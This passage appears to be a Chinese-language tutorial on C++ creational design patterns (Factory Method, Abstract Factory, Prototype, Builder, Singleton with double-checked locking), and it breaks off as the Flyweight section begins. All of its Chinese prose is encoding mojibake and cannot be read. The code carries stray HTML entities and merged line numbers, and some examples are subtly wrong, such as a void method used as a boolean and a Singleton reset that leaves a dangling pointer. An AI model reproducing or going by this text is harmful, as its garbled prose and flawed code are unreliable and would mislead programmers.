æ˜¯ä¸ç”¨é‡æ–°ç¼–è¯‘çš„ã€‚æœ‰æ–°çš„ç±»å‹éœ€è¦åˆ›å»ºï¼Œç›´æ¥å¢åŠ ä¸€ä¸ªæ–°çš„æºæ–‡ä»¶å³å¯ã€‚ Factory Methodæ¨¡å¼ç”¨äºéš”ç¦»ç±»å¯¹è±¡çš„ä½¿ç”¨è€…å’Œå…·ä½“ç±»å‹ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚é¢å¯¹ä¸€ä¸ªç»å¸¸å˜åŒ–çš„å…·ä½“ç±»å‹ï¼Œç´§è€¦åˆå…³ç³»(new)ä¼šå¯¼è‡´è½¯ä»¶çš„è„†å¼±ã€‚ å°†æ‰€è¦åˆ›å»ºçš„å…·ä½“å¯¹è±¡å·¥ä½œå»¶è¿Ÿåˆ°å­ç±»ï¼ˆBinarySplitterFactoryã€TxtSplitterFactoryï¼‰ï¼Œä»è€Œå®ç°ä¸€ç§æ‰©å±•ï¼ˆè€Œéæ›´æ”¹ï¼‰çš„ç­–ç•¥ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include &lt;iostream&gt;#include &lt;string&gt;/* * Product * products implement the same interface so that the classes can refer * to the interface not the concrete product */class Product&#123;public: virtual ~Product() &#123;&#125; virtual std::string getName() = 0; // ...&#125;;/* * Concrete Product * define product to be created */class ConcreteProductA : public Product&#123;public: ~ConcreteProductA() &#123;&#125; std::string getName() &#123; return \"type A\"; &#125; // ...&#125;;/* * Concrete Product * define product to be created */class ConcreteProductB : public Product&#123;public: ~ConcreteProductB() &#123;&#125; std::string getName() &#123; return \"type B\"; &#125; // ...&#125;;/* * Creator * contains the implementation for all of the methods * to manipulate products except for the factory method */class Creator&#123;public: virtual ~Creator() &#123;&#125; virtual Product* createProductA() = 0; virtual Product* createProductB() = 0; virtual void removeProduct( Product *product ) = 0; // ...&#125;;/* * Concrete Creator * implements factory method that is responsible for creating * one or more concrete products ie. it is class that has * the knowledge of how to create the products */class ConcreteCreator : public Creator&#123;public: ~ConcreteCreator() &#123;&#125; Product* createProductA() &#123; return new ConcreteProductA(); &#125; Product* createProductB() &#123; return new ConcreteProductB(); &#125; void removeProduct( Product *product ) &#123; delete product; &#125; // ...&#125;;int main()&#123; Creator *creator = new ConcreteCreator(); Product *p1 = creator-&gt;createProductA(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p1-&gt;getName() &lt;&lt; std::endl; creator-&gt;removeProduct( p1 ); Product *p2 = creator-&gt;createProductB(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p2-&gt;getName() &lt;&lt; std::endl; creator-&gt;removeProduct( p2 ); delete creator; return 0;&#125; ä»¥ä¸Šä»£ç çš„ creator å°†ä¸åŒåˆ›å»ºæ–¹æ³•æ•´åˆåˆ°ä¸€ä¸ªç±»ä¸­ã€‚ä¹Ÿå¯ä»¥æŒ‰ç…§ç¤ºä¾‹1çš„æ–¹æ³•ï¼Œcreator è½¬åŒ–ä¸ºä¸åŒçš„å­ç±»ã€‚ Abstract Factory ç±»ä¼¼Factory Methodçš„ä½œç”¨ï¼Œä¸è¿‡éœ€è¦åˆ›å»ºçš„å¯¹è±¡æ˜¯â€œä¸€ç³»åˆ—ç›¸äº’å…³è”çš„å¯¹è±¡â€ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°†è¿™ä¸€ç³»åˆ—å¯¹è±¡çš„åˆ›å»ºï¼Œæ±‡é›†åˆ°ä¸€ä¸ªå·¥å‚ç±»ä¸­ã€‚ ç¤ºä¾‹2 å®ç°ä¸€ä¸ªå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ•°æ®åº“çš„ç±»ï¼Œå¯è¿›è¡Œæ•°æ®åº“çš„è¿æ¥ã€SQLè¯­å¥æ‰§è¡Œã€‚ å®ç°ä¸€ï¼Œæ ¹æ®ä¸åŒåŠŸèƒ½ï¼Œå»ºç«‹ä¸åŒçš„å·¥å‚ã€‚ 12345678910111213141516171819202122232425262728//ConnectionåŸºç±»class IDBConnection&#123;...&#125;;class IDBConnectionFactory&#123;public: virtual IDBConnection* CreateDBConnection()=0;&#125;;//CommandåŸºç±»class IDBCommand&#123;&#125;;class IDBCommandFactory&#123;public: virtual IDBCommand* CreateDBCommand()=0;&#125;;//ReaderåŸºç±»class IDataReader&#123;&#125;;class IDataReaderFactory&#123;public: virtual IDataReader* CreateDataReader()=0;&#125;;//SQLæ•°æ®åº“ç±»å·¥å‚ 3 ä¸ªclass SqlConnection: public IDBConnection&#123;&#125;;class SqlConnectionFactory:public IDBConnectionFactory&#123;&#125;;class SqlCommand: public IDBCommand&#123;&#125;;class SqlCommandFactory:public IDBCommandFactory&#123;&#125;;class SqlDataReader: public IDataReader&#123;&#125;;class SqlDataReaderFactory:public IDataReaderFactory&#123;&#125;; 12345678910111213141516171819202122// ä½¿ç”¨3ä¸ªå·¥å‚class EmployeeDAO&#123; IDBConnectionFactory* dbConnectionFactory; IDBCommandFactory* dbCommandFactory; IDataReaderFactory* dataReaderFactory; public: // æ„é€ å‡½æ•°ä¼ å…¥FactoryæŒ‡é’ˆ ... vector&lt;EmployeeDO&gt; GetEmployees()&#123; IDBConnection* connection = dbConnectionFactory-&gt;CreateDBConnection(); connection-&gt;ConnectionString(\"...\"); IDBCommand* command = dbCommandFactory-&gt;CreateDBCommand(); command-&gt;CommandText(\"...\"); command-&gt;SetConnection(connection); //å…³è”æ€§,ä½¿ç”¨connection IDBDataReader* reader = command-&gt;ExecuteReader(); while (reader-&gt;Read())&#123;...&#125; &#125;&#125;; ä»¥ä¸Šä»£ç ï¼Œé™¤äº†ä¸å¤Ÿç®€æ´ï¼Œè¿˜æœ‰å¯èƒ½ä¼ å…¥ä¸åŒ¹é…çš„ Connection å¯¹è±¡å’Œ Command å¯¹è±¡ï¼ˆæ¯”å¦‚ SQLçš„Connection å’Œ MongoDBçš„Commandï¼‰ã€‚ å®ç°äºŒï¼Œä½¿ç”¨ä¸€ä¸ªå·¥å‚ï¼Œå®Œæˆå¯¹è±¡åˆ›å»ºã€‚ 12345678910111213141516171819202122232425262728293031//æ•°æ®åº“è®¿é—®æœ‰å…³çš„åŸºç±»class IDBConnection&#123;...&#125;;class IDBCommand&#123;...&#125;;class IDataReader&#123;...&#125;;// FactoryåŸºç±»class IDBFactory&#123;public: ... virtual IDBConnection* CreateDBConnection()=0; virtual IDBCommand* CreateDBCommand()=0; virtual IDataReader* CreateDataReader()=0; ...&#125;;// SQLæ•°æ®åº“çš„ç›¸å…³ç±»class SqlConnection: public IDBConnection&#123;...&#125;;class SqlCommand: public IDBCommand&#123;...&#125;;class SqlDataReader: public IDataReader&#123;...&#125;;// SQLæ•°æ®åº“å„ä¸ªç›¸å…³ç±»çš„åˆ›å»ºå·¥å‚class SqlDBFactory:public IDBFactory&#123;public: ... virtual IDBConnection* CreateDBConnection()=0; virtual IDBCommand* CreateDBCommand()=0; virtual IDataReader* CreateDataReader()=0; ...&#125;; 12345678910111213141516class EmployeeDAO&#123; IDBFactory* dbFactory; public: vector&lt;EmployeeDO&gt; GetEmployees()&#123; IDBConnection* connection = dbFactory-&gt;CreateDBConnection(); connection-&gt;ConnectionString(\"...\"); IDBCommand* command = dbFactory-&gt;CreateDBCommand(); command-&gt;CommandText(\"...\"); command-&gt;SetConnection(connection); IDBDataReader* reader = command-&gt;ExecuteReader(); while (reader-&gt;Read())&#123;...&#125; &#125;&#125;; ä½¿ç”¨ä¸€ä¸ªç±»ç®¡ç†ç›¸å…³å¯¹è±¡çš„åˆ›å»ºã€‚Abstract Factoryæ¨¡å¼ä¸»è¦åœ¨äºåº”å¯¹â€œæ–°ç³»åˆ—â€çš„éœ€æ±‚å˜åŠ¨ã€‚å…¶ç¼ºç‚¹åœ¨äºéš¾ä»¥åº”å¯¹â€œæ–°å¯¹è±¡â€çš„éœ€æ±‚å˜åŠ¨ï¼Œè¿™å°±æ˜¯Factory Methodçš„äº‹æƒ…äº†ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156#include &lt;iostream&gt;/* * Product A * products implement the same interface so that the classes can refer * to the interface not the concrete product */class ProductA&#123;public: virtual ~ProductA() &#123;&#125; virtual const char* getName() = 0; // ...&#125;;/* * ConcreteProductAX and ConcreteProductAY * define objects to be created by concrete factory */class ConcreteProductAX : public ProductA&#123;public: ~ConcreteProductAX() &#123;&#125; const char* getName() &#123; return \"A-X\"; &#125; // ...&#125;;class ConcreteProductAY : public ProductA&#123;public: ~ConcreteProductAY() &#123;&#125; const char* getName() &#123; return \"A-Y\"; &#125; // ...&#125;;/* * Product B * same as Product A, Product B declares interface for concrete products * where each can produce an entire set of products */class ProductB&#123;public: virtual ~ProductB() &#123;&#125; virtual const char* getName() = 0; // ...&#125;;/* * ConcreteProductBX and ConcreteProductBY * same as previous concrete product classes */class ConcreteProductBX : public ProductB&#123;public: ~ConcreteProductBX() &#123;&#125; const char* getName() &#123; return \"B-X\"; &#125; // ...&#125;;class ConcreteProductBY : public ProductB&#123;public: ~ConcreteProductBY() &#123;&#125; const char* getName() &#123; return \"B-Y\"; &#125; // ...&#125;;/* * Abstract Factory * provides an abstract interface for creating a family of products */class AbstractFactory&#123;public: virtual ~AbstractFactory() &#123;&#125; virtual ProductA *createProductA() = 0; virtual ProductB *createProductB() = 0;&#125;;/* * Concrete Factory X and Y * each concrete factory create a family of products and client uses * one of these factories so it never has to instantiate a product object */class ConcreteFactoryX : public AbstractFactory&#123;public: ~ConcreteFactoryX() &#123;&#125; ProductA *createProductA() &#123; return new ConcreteProductAX(); &#125; ProductB *createProductB() &#123; return new ConcreteProductBX(); &#125; // ...&#125;;class ConcreteFactoryY : public AbstractFactory&#123;public: ~ConcreteFactoryY() &#123;&#125; ProductA *createProductA() &#123; return new ConcreteProductAY(); &#125; ProductB *createProductB() &#123; return new ConcreteProductBY(); &#125; // ...&#125;;int main()&#123; ConcreteFactoryX *factoryX = new ConcreteFactoryX(); ConcreteFactoryY *factoryY = new ConcreteFactoryY(); ProductA *p1 = factoryX-&gt;createProductA(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p1-&gt;getName() &lt;&lt; std::endl; ProductA *p2 = factoryY-&gt;createProductA(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p2-&gt;getName() &lt;&lt; std::endl; delete p1; delete p2; delete factoryX; delete factoryY; return 0;&#125; ç»“æ„å’Œç¤ºä¾‹2ç¨æœ‰ä¸åŒã€‚ Prototype å’ŒFactory Methodä¸€æ ·ï¼Œç”¨äºåˆ›é€ å¯¹è±¡ï¼Œä½†æ˜¯æ˜¯é€šè¿‡æ‹·è´åŸå‹æ¥åˆ›å»ºå¯¹è±¡ã€‚ç±»çš„æ‹·è´æ„é€ å‡½æ•°éœ€è¦æŒ‡å®šæ­£ç¡®ã€‚æ‹·è´æŒ‡çš„æ˜¯æ·±æ‹·è´ã€‚ å’ŒFactory Methodä¸åŒçš„æ˜¯ï¼ŒPrototypeæ›´å…³æ³¨å¯¹è±¡åˆå§‹çŠ¶æ€çš„å˜åŒ–ï¼Œå¯ä»¥åˆ›å»ºå‡ ç§ä¸åŒçš„çŠ¶æ€çš„åŸå‹ï¼Œä¾›ç¨‹åºä½¿ç”¨ã€‚ ç¤ºä¾‹3 ç¤ºä¾‹å’ŒFactory Methodä¸€æ ·ï¼Œåœ¨Factory MethodåŸºç¡€ä¸Šåšäº†æ”¹åŠ¨ï¼Œå˜æˆPrototypeæ¨¡å¼ã€‚ 12345678910111213141516171819202122//å°†æŠ½è±¡ç±»å’Œå·¥å‚åŸºç±»åˆå¹¶ä¸ºä¸€ä¸ªç±»class ISplitter&#123;public: virtual void split()=0; virtual ISplitter* clone()=0; //é€šè¿‡å…‹éš†è‡ªå·±æ¥åˆ›å»ºå¯¹è±¡ virtual ~ISplitter()&#123;&#125;&#125;;//å…·ä½“ç±»class BinarySplitter : public ISplitter&#123;public: virtual ISplitter* clone()&#123; return new BinarySplitter(*this); //é€šè¿‡å…‹éš†è‡ªå·±æ¥åˆ›å»ºå¯¹è±¡ &#125;&#125;;class TxtSplitter: public ISplitter&#123;public: virtual ISplitter* clone()&#123; return new TxtSplitter(*this); //é€šè¿‡å…‹éš†è‡ªå·±æ¥åˆ›å»ºå¯¹è±¡ &#125;&#125;; 1234567891011class MainForm : public Form &#123; ISplitter* prototype;//åŸå‹å¯¹è±¡public: MainForm(ISplitter* prototype)&#123; this-&gt;prototype=prototype; &#125; void Button_Click()&#123; ISplitter * splitter=prototype-&gt;clone(); //å…‹éš†åŸå‹ splitter-&gt;split(); &#125;&#125;; å½“ä¸€ä¸ªç³»ç»Ÿåº”è¯¥ç‹¬ç«‹äºå®ƒçš„äº§å“åˆ›å»ºã€æ„æˆå’Œè¡¨ç¤ºæ—¶ï¼Œè¦ä½¿ç”¨ Prototypeæ¨¡å¼ã€‚å½“ä¸€ä¸ªç±»çš„å®ä¾‹åªèƒ½æœ‰å‡ ä¸ªä¸åŒçŠ¶æ€ç»„åˆä¸­çš„ä¸€ç§æ—¶ã€‚å»ºç«‹ç›¸åº”æ•°ç›®çš„åŸå‹å¹¶å…‹éš†å®ƒä»¬ å¯èƒ½æ¯”æ¯æ¬¡ç”¨åˆé€‚çš„çŠ¶æ€æ‰‹å·¥å®ä¾‹åŒ–è¯¥ç±»æ›´æ–¹ä¾¿ä¸€äº›ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;iostream&gt;#include &lt;string&gt;/* * Prototype * declares an interface for cloning itself */class Prototype&#123;public: virtual ~Prototype() &#123;&#125; virtual Prototype* clone() = 0; virtual std::string type() = 0; // ...&#125;;/* * Concrete Prototype A and B * implement an operation for cloning itself */class ConcretePrototypeA : public Prototype&#123;public: ~ConcretePrototypeA() &#123;&#125; Prototype* clone() &#123; return new ConcretePrototypeA(); &#125; std::string type() &#123; return \"type A\"; &#125; // ...&#125;;class ConcretePrototypeB : public Prototype&#123;public: ~ConcretePrototypeB() &#123;&#125; Prototype* clone() &#123; return new ConcretePrototypeB(); &#125; std::string type() &#123; return \"type B\"; &#125; // ...&#125;;/* * Client * creates a new object by asking a prototype to clone itself */class Client&#123;public: static void init() &#123; types[ 0 ] = new ConcretePrototypeA(); types[ 1 ] = new ConcretePrototypeB(); &#125; static void remove() &#123; delete types[ 0 ]; delete types[ 1 ]; &#125; static Prototype* make( const int index ) &#123; if ( index &gt;= n_types ) &#123; return nullptr; &#125; return types[ index ]-&gt;clone(); &#125; // ...private: static Prototype* types[ 2 ]; // declaration static int n_types;&#125;;Prototype* Client::types[ 2 ]; // definitionint Client::n_types = 2;int main()&#123; Client::init(); Prototype *prototype1 = Client::make( 0 ); std::cout &lt;&lt; \"Prototype: \" &lt;&lt; prototype1-&gt;type() &lt;&lt; std::endl; delete prototype1; Prototype *prototype2 = Client::make( 1 ); std::cout &lt;&lt; \"Prototype: \" &lt;&lt; prototype2-&gt;type() &lt;&lt; std::endl; delete prototype2; Client::remove(); return 0;&#125; Builder åœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰æ—¶å€™é¢ä¸´ç€â€œä¸€ä¸ªå¤æ‚å¯¹è±¡â€çš„åˆ›å»ºå·¥ä½œï¼Œå®ƒçš„åˆ›å»ºè¿‡ç¨‹æ˜¯ä¸€å¥—å›ºå®šçš„ç»„åˆæ–¹æ³•ï¼Œå’Œå¤šä¸ªä¸åŒçš„è¢«ç»„åˆçš„å­å¯¹è±¡ã€‚ Builderå°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸å…¶è¡¨ç¤ºç›¸åˆ†ç¦»ï¼Œä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹(ç¨³å®š)å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤º(å˜åŒ–)ã€‚ è¿™ä¸ªç±»ä¼¼Template Methodï¼Œä¸è¿‡Builderæ˜¯é’ˆå¯¹å¯¹è±¡çš„åˆ›å»ºæ¥è¿›è¡Œè®¾è®¡çš„ã€‚ ç¤ºä¾‹4 å®ç°ä¸€ä¸ªç¨‹åºï¼Œå¯ä»¥åˆ›å»ºå‡ºä¸åŒç§ç±»çš„æˆ¿å­å›¾åƒã€‚ 1234567891011121314151617181920212223242526272829303132333435363738// HouseæŠ½è±¡åŸºç±»class House&#123; //...&#125;;// Houseå»ºæˆ¿é…ç½®çš„åŸºç±»class HouseBuilder &#123;public: House* GetResult()&#123; return pHouse; &#125; virtual ~HouseBuilder()&#123;&#125;protected: House* pHouse; virtual void BuildPart1()=0; virtual void BuildPart2()=0; virtual void BuildPart3()=0; virtual void BuildPart4()=0; virtual void BuildPart5()=0;&#125;;// é€šç”¨å›¾å½¢ç»˜åˆ¶é€»è¾‘ï¼Œç¨³å®šclass HouseDirector&#123; HouseBuilder* pHouseBuilder;public: // æ³¨æ„ä¸è¦åœ¨C++çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•° HouseDirector(HouseBuilder* pHouseBuilder)&#123; this-&gt;pHouseBuilder=pHouseBuilder; &#125; House* Construct()&#123; pHouseBuilder-&gt;BuildPart1(); for (int i = 0; i &lt; 4; i++)&#123; pHouseBuilder-&gt;BuildPart2(); &#125; bool flag=pHouseBuilder-&gt;BuildPart3(); if(flag)&#123; pHouseBuilder-&gt;BuildPart4(); &#125; pHouseBuilder-&gt;BuildPart5(); return pHouseBuilder-&gt;GetResult(); &#125;&#125;; 12345678910111213// å…·ä½“ç±»ï¼ŒStoneHouseçš„å‚æ•°ç±»class StoneHouse: public House&#123;...&#125;;// å…·ä½“ç±»ï¼Œæ„å»ºStoneHouseå„ä¸ªéƒ¨åˆ†çš„å…·ä½“ç®—æ³•å®ç°class StoneHouseBuilder: public HouseBuilder&#123;protected: virtual void BuildPart1()&#123;...&#125; virtual void BuildPart2()&#123;...&#125; virtual void BuildPart3()&#123;...&#125; virtual void BuildPart4()&#123;...&#125; virtual void BuildPart5()&#123;...&#125; &#125;; è¿™æ ·å¦‚æœæœ‰å…¶å®ƒç§ç±»çš„Houseï¼Œå¯ä»¥æ–°åˆ›å»ºHouseå’ŒHouseBuilderçš„å­ç±»å³å¯ã€‚ Builder æ¨¡å¼ä¸»è¦ç”¨äºâ€œåˆ†æ­¥éª¤æ„å»ºä¸€ä¸ªå¤æ‚çš„å¯¹è±¡â€ã€‚åœ¨è¿™å…¶ä¸­â€œåˆ†æ­¥éª¤â€æ˜¯ä¸€ä¸ªç¨³å®šçš„ç®—æ³•ï¼Œè€Œå¤æ‚å¯¹è±¡çš„å„ä¸ªéƒ¨åˆ†åˆ™ç»å¸¸å˜åŒ–ã€‚ å˜åŒ–ç‚¹åœ¨å“ªé‡Œï¼Œå°è£…å“ªé‡Œâ€”â€” Builderæ¨¡å¼ä¸»è¦åœ¨äºåº”å¯¹â€œå¤æ‚å¯¹è±¡å„ä¸ªéƒ¨åˆ†â€çš„é¢‘ç¹éœ€æ±‚å˜åŠ¨ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#include &lt;iostream&gt;#include &lt;string&gt;/* * Product * the final object that will be created using Builder */class Product&#123;public: void makeA( const std::string &amp;part ) &#123; partA = part; &#125; void makeB( const std::string &amp;part ) &#123; partB = part; &#125; void makeC( const std::string &amp;part ) &#123; partC = part; &#125; std::string get() &#123; return (partA + \" \" + partB + \" \" + partC); &#125; // ... private: std::string partA; std::string partB; std::string partC; // ...&#125;;/* * Builder * abstract interface for creating products */class Builder&#123;public: virtual ~Builder() &#123;&#125; Product get() &#123; return product; &#125; virtual void buildPartA() = 0; virtual void buildPartB() = 0; virtual void buildPartC() = 0; // ...protected: Product product;&#125;;/* * Concrete Builder X and Y * create real products and stores them in the composite structure */class ConcreteBuilderX : public Builder&#123;public: void buildPartA() &#123; product.makeA( \"A-X\" ); &#125; void buildPartB() &#123; product.makeB( \"B-X\" ); &#125; void buildPartC() &#123; product.makeC( \"C-X\" ); &#125; // ...&#125;;class ConcreteBuilderY : public Builder&#123;public: void buildPartA() &#123; product.makeA( \"A-Y\" ); &#125; void buildPartB() &#123; product.makeB( \"B-Y\" ); &#125; void buildPartC() &#123; product.makeC( \"C-Y\" ); &#125; // ...&#125;;/* * Director * responsible for managing the correct sequence of object creation */class Director &#123;public: Director() : builder() &#123;&#125; ~Director() &#123; if ( builder ) &#123; delete builder; &#125; &#125; void set( Builder *b ) &#123; if ( builder ) &#123; delete builder; &#125; builder = b; &#125; Product get() &#123; return builder-&gt;get(); &#125; void construct() &#123; builder-&gt;buildPartA(); builder-&gt;buildPartB(); builder-&gt;buildPartC(); // ... &#125; // ...private: Builder *builder;&#125;;int main()&#123; Director director; director.set( new ConcreteBuilderX ); director.construct(); Product product1 = director.get(); std::cout &lt;&lt; \"1st product parts: \" &lt;&lt; product1.get() &lt;&lt; std::endl; director.set( new ConcreteBuilderY ); director.construct(); Product product2 = director.get(); std::cout &lt;&lt; \"2nd product parts: \" &lt;&lt; product2.get() &lt;&lt; std::endl; return 0;&#125; å¯¹è±¡æ€§èƒ½ç›¸å…³æ¨¡å¼ å¤„ç†é¢å‘å¯¹è±¡ç¼–ç¨‹æ‰€äº§ç”Ÿçš„é¢å¤–ä»£ä»·ï¼Œæ¯”å¦‚å¤ªå¤šçš„å¯¹è±¡åˆ›å»ºçš„èµ„æºæ¶ˆè€—ç­‰é—®é¢˜ã€‚ å…¸å‹æ¨¡å¼ï¼š Singleton Flyweight Singleton å¤„ç†ä¸€ä¸ªç±»ï¼Œåªå…è®¸ä¸€ä¸ªå®ä¾‹å­˜åœ¨ï¼Œæˆ–è€…åªéœ€è¦å­˜åœ¨ä¸€ä¸ªå¯¹è±¡å³å¯ã€‚ Singletonä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚ ç¤ºä¾‹5 å•çº¿ç¨‹ç¯å¢ƒä¸‹å®ç° 123456789101112131415161718class Singleton&#123;private: static Singleton* m_instance; Singleton(); Singleton(const Singleton&amp; other);public: static Singleton* getInstance();&#125;;Singleton* Singleton::m_instance=nullptr;//çº¿ç¨‹éå®‰å…¨ç‰ˆæœ¬Singleton* Singleton::getInstance() &#123; if (m_instance == nullptr) &#123; m_instance = new Singleton(); &#125; return m_instance;&#125; ç‰ˆæœ¬äºŒï¼Œä»£ä»·è¿‡é«˜ï¼ˆç›¸å¯¹è€Œè¨€ï¼‰ 12345678//çº¿ç¨‹å®‰å…¨ç‰ˆæœ¬ï¼Œä½†é”çš„ä»£ä»·è¿‡é«˜. è¯»å˜é‡ï¼Œä¸éœ€è¦è·å–é”ï¼Œåªæœ‰å†™æ‰éœ€è¦åŠ é”Singleton* Singleton::getInstance() &#123; Lock lock; if (m_instance == nullptr) &#123; m_instance = new Singleton(); &#125; return m_instance;&#125; åŒæ£€æŸ¥ï¼Œç¬¬ä¸€ä¸ªåˆ¤æ–­ä¿è¯è¯»å˜é‡ä¸ä¼šè·å–é”ã€‚ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œä¿è¯å½“ä¸¤ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹éƒ½è¿›å…¥äº†ç¬¬ä¸€ä¸ªåˆ¤æ–­å†…ï¼Œä¸ä¼šåˆ›å»ºå¤šä¸ªå¯¹è±¡ã€‚ 12345678910//åŒæ£€æŸ¥é”ï¼Œä½†ç”±äºå†…å­˜è¯»å†™reorderä¸å®‰å…¨ï¼Œç›´æ¥ä»¥ä¸‹ä»£ç æ˜¯ä¸èƒ½åº”ç”¨çš„Singleton* Singleton::getInstance() &#123; if(m_instance==nullptr)&#123; Lock lock; if (m_instance == nullptr) &#123; m_instance = new Singleton(); &#125; &#125; return m_instance;&#125; ä½†æ˜¯ï¼Œm_instance = new Singleton() åœ¨cpuæŒ‡ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå‡ºç°æŒ‡ä»¤reorderçš„æƒ…å†µã€‚å› ä¸ºç¼–è¯‘å™¨ä¼šå¯¹æ±‡ç¼–ä»£ç è¿›è¡Œä¼˜åŒ–ã€‚æ¯”å¦‚ï¼ŒæŒ‡ä»¤é¡ºåºä¸ºï¼ˆåˆ†é…å†…å­˜--è°ƒç”¨æ„é€ å™¨--å°†å¯¹è±¡èµ‹å€¼åˆ°å˜é‡å†…å­˜ï¼‰ï¼Œå¯èƒ½å˜æˆï¼ˆåˆ†é…å†…å­˜--å°†å¯¹è±¡èµ‹å€¼åˆ°å˜é‡å†…å­˜--è°ƒç”¨æ„é€ å™¨ï¼‰ã€‚ å› æ­¤ï¼Œå½“æŒ‡ä»¤æ‰§è¡Œé¡ºåºæ˜¯ï¼ˆåˆ†é…å†…å­˜--å°†å¯¹è±¡èµ‹å€¼åˆ°å˜é‡å†…å­˜--è°ƒç”¨æ„é€ å™¨ï¼‰æ—¶ï¼Œçº¿ç¨‹1å¯èƒ½å¤„åœ¨ï¼ˆåˆ†é…å†…å­˜--å°†å¯¹è±¡èµ‹å€¼åˆ°å˜é‡å†…å­˜ï¼‰é˜¶æ®µï¼Œæ­¤æ—¶ m_instance != nullptrã€‚å¦‚æœæ­¤æ—¶çº¿ç¨‹2ï¼Œå¼€å§‹ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œä¼šç›´æ¥è·³è½¬åˆ° return m_instanceï¼Œä½†æ˜¯ m_instance å¹¶æ²¡æœ‰è°ƒç”¨æ„é€ å™¨ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå¯ç”¨çš„å¯¹è±¡ã€‚é—®é¢˜å°±å‡ºç°äº†ã€‚ C++ 11ç‰ˆæœ¬ä¹‹åçš„è·¨å¹³å°å®ç°åŒæ£€æŸ¥ï¼š 123456789101112131415161718//C++ 11ç‰ˆæœ¬ä¹‹åçš„è·¨å¹³å°å®ç° (Java ä¸­ä½¿ç”¨ volatile ç¦æ­¢cpuæŒ‡ä»¤reorder)std::atomic&lt;Singleton*&gt; Singleton::m_instance;std::mutex Singleton::m_mutex;Singleton* Singleton::getInstance() &#123; Singleton* tmp = m_instance.load(std::memory_order_relaxed); std::atomic_thread_fence(std::memory_order_acquire);//è·å–å†…å­˜fence if (tmp == nullptr) &#123; std::lock_guard&lt;std::mutex&gt; lock(m_mutex); tmp = m_instance.load(std::memory_order_relaxed); if (tmp == nullptr) &#123; tmp = new Singleton; std::atomic_thread_fence(std::memory_order_release);//é‡Šæ”¾å†…å­˜fence m_instance.store(tmp, std::memory_order_relaxed); &#125; &#125; return tmp;&#125; Singletonçš„æ„é€ å™¨å¯ä»¥è®¾ç½®ä¸ºprotectedï¼Œå…è®¸å­ç±»æ´¾ç”Ÿã€‚ä¸€èˆ¬ä¸è¦æ”¯æŒæ‹·è´æ„é€ å‡½æ•°ï¼Œæˆ–è€…cloneæ¥å£ã€‚ æŠ½è±¡ä»£ç ç»“æ„ å•çº¿ç¨‹ç‰ˆ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;/* * Singleton * has private static variable to hold one instance of the class * and method which gives us a way to instantiate the class */class Singleton&#123;public: // The copy constructor and assignment operator // are defined as deleted, which means that you // can't make a copy of singleton. // // Note: you can achieve the same effect by declaring // the constructor and the operator as private Singleton( Singleton const&amp; ) = delete; Singleton&amp; operator=( Singleton const&amp; ) = delete; static Singleton* get() &#123; if ( !instance ) &#123; instance = new Singleton(); &#125; return instance; &#125; static void restart() &#123; if ( instance ) &#123; delete instance; &#125; &#125; void tell() &#123; std::cout &lt;&lt; \"This is Singleton.\" &lt;&lt; std::endl; // ... &#125; // ...private: Singleton() &#123;&#125; static Singleton *instance; // ...&#125;;Singleton* Singleton::instance = nullptr;int main()&#123; Singleton::get()-&gt;tell(); Singleton::restart(); return 0;&#125; Flyweight å¯¹äºå¤§é‡å­˜åœ¨çš„å¯¹è±¡ï¼Œä¼šäº§ç”Ÿè¾ƒé«˜çš„å†…å­˜ä¸Šä»£ä»·ã€‚ Flyweightï¼ˆäº«å…ƒï¼‰è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚ åŸç†å°±æ˜¯å°†å¯¹è±¡ä»¥ä¸€ä¸ªå…¨å±€å”¯ä¸€keyï¼Œå‚¨å­˜åœ¨ä¸€ä¸ªå¯¹è±¡è®°å½•æ•°æ®ç»“æ„ä¸­ã€‚å½“ä¸‹ä¸€æ¬¡ä½¿ç”¨åŒä¸€å¯¹è±¡ï¼Œç›´æ¥æŸ¥æ‰¾è®°å½•ï¼Œè¿”å›å·²ç»å­˜åœ¨çš„å¯¹è±¡ã€‚ ç¤ºä¾‹6 å®ç°èƒ½å¤Ÿæ˜¾ç¤ºæ¯ç§å­—ä½“å±æ€§çš„ç¨‹åºã€‚ 